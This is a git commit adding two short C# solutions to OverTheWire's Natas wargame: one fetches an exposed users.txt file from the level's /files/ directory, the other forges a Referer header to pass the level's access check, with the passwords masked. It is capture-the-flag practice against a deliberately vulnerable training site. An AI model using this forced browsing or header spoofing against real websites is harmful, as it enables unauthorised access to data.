f5105a859d18f4845e24013cc7a54903c98255bb
Cytrix <code@cytrix.dev>
2022-10-28 10:42:02 -0400

    Natas Wargame

---
+++ Wargame/Natas/natas2.cs
@@ -0,0 +1,20 @@
+using System.Net.Http;
+using System.Text;
+
+HttpClient client = new HttpClient();
+client.BaseAddress = new Uri("http://natas2.natas.labs.overthewire.org");
+string credential = Convert.ToBase64String(ASCIIEncoding.ASCII.GetBytes("natas2:???????????????????????????????????????"));
+
+//HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Get, "/index.html");
+//HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Get, "/files/");
+HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Get, "/files/users.txt");
+request.Headers.Add("Authorization", "Basic " + credential);
+
+HttpResponseMessage httpResponse = await client.SendAsync(request);
+httpResponse.EnsureSuccessStatusCode();
+String body = await httpResponse.Content.ReadAsStringAsync();
+Console.WriteLine(body) ;
+
+
+
+Console.ReadLine();
---
+++ Wargame/Natas/natas4.cs
@@ -0,0 +1,16 @@
+using System.Net.Http;
+using System.Text;
+
+HttpClient client = new HttpClient();
+client.BaseAddress = new Uri("http://natas4.natas.labs.overthewire.org");
+string credential = Convert.ToBase64String(ASCIIEncoding.ASCII.GetBytes("natas4:???????????????????????????????????????"));
+
+HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Get, "/index.html");
+request.Headers.Add("Authorization", "Basic " + credential);
+
+request.Headers.Add("Referer", "http://natas5.natas.labs.overthewire.org");
+
+HttpResponseMessage httpResponse = await client.SendAsync(request);
+httpResponse.EnsureSuccessStatusCode();
+String body = await httpResponse.Content.ReadAsStringAsync();
+Console.WriteLine(body) ;
